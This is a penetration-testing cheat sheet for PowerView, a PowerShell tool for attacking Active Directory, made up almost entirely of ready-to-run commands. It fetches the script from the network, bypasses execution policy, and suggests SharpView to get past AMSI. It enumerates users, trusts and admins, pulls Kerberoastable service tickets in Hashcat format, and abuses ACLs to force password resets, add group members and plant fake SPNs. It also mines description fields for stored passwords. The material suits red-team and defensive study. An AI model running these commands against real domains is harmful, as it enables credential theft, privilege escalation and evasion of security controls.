+++
title = "PowerView"
+++

- Maintained: https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/situational_awareness/network/powerview.ps1
- Docs: https://powersploit.readthedocs.io/en/latest/Recon/

Although dated and heavily flagged by security products, the underlying LDAP queries have not changed and are still functional. Use **SharpView** (.NET port, same syntax) when PowerShell hardening or AMSI is blocking

## Import

```powershell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
```

If authenticating as a different privileged user:

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
```

## User and Group Enumeration

```powershell
# Enumerate a specific user (full attribute set)
Get-DomainUser -Identity <USER> -Domain <DOMAIN> | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Export all domain usernames to a file (e.g. for Kerbrute)
Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} | Set-Content adusers.txt

# Enumerate Domain Admins (recursive group membership)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Get group membership of a specific user
Get-DomainGroup -Identity "<GROUP>" | select memberof

# Test admin access on a remote machine
Test-AdminAccess -ComputerName <MACHINE>
```

## Domain Trust Enumeration

```powershell
# List all domain trusts
Get-DomainTrust
Get-DomainTrustMapping

# Get all users in a remote domain
Get-DomainUser -Domain <DOMAIN> | select SamAccountName

# Get current domain SID
Get-DomainSID

# Get Enterprise Admins group SID from parent domain
Get-DomainGroup -Domain <DOMAIN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

## Kerberoastable Account Enumeration

```powershell
# List all accounts with SPNs (kerberoastable)
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainUser * -spn | select samaccountname,description

# Get TGS ticket for a specific SPN account (Hashcat format)
Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
```

## ACL Enumeration

```powershell
# Find all ACL entries where our user has control rights
$sid = Convert-NameToSid <USER>
# Pay attention to ObjectAceType and ActiveDirectoryRights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose

# Get group membership of a user (to repeat ACL check on groups)
Get-DomainGroup -Identity "<GROUP>" | select memberof
```

## ACL Abuse

```powershell
# ForceChangePassword -- change a user's password (requires ForceChangePassword ACE)
$newPassword = ConvertTo-SecureString '<NEW_PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword -Identity <USER> -AccountPassword $newPassword -Credential $Cred -Verbose

# AddMember -- add a user to a group (requires AddMember ACE)
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred -Verbose
# Remove a user from a group
Remove-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred -Verbose
# Verify membership after add or remove
Get-DomainGroupMember -Identity '<GROUP>' -Credential $Cred | Select MemberName

# GenericWrite -- create a fake SPN to Kerberoast the account (targeted Kerberoasting)
# SPN_NAME format: serviceclass/host[:port] e.g. MSSQLSvc/sql01.domain.local:1433
Set-DomainObject -Credential $Cred -Identity <USER> -SET @{serviceprincipalname='<SPN_NAME>'} -Verbose

# Cleanup: remove fake SPN after cracking
Set-DomainObject -Credential $Cred -Identity <USER> -Clear <SPN_NAME> -Verbose
```

## Checking Access Rights

```powershell
# Check who has RDP access to a machine
Get-NetLocalGroupMember -GroupName "Remote Desktop Users" -ComputerName <COMPUTER_NAME>

# Check who has WinRM access to a machine
Get-NetLocalGroupMember -GroupName "Remote Management Users" -ComputerName <COMPUTER_NAME>
```

## User Attributes Mining

```powershell
# Find passwords stored in user description fields
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}

# Find PASSWD_NOTREQD accounts -- not subject to password policy length (potential blank passwords)
# https://ldapwiki.com/wiki/Wiki.jsp?page=PASSWD_NOTREQD
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
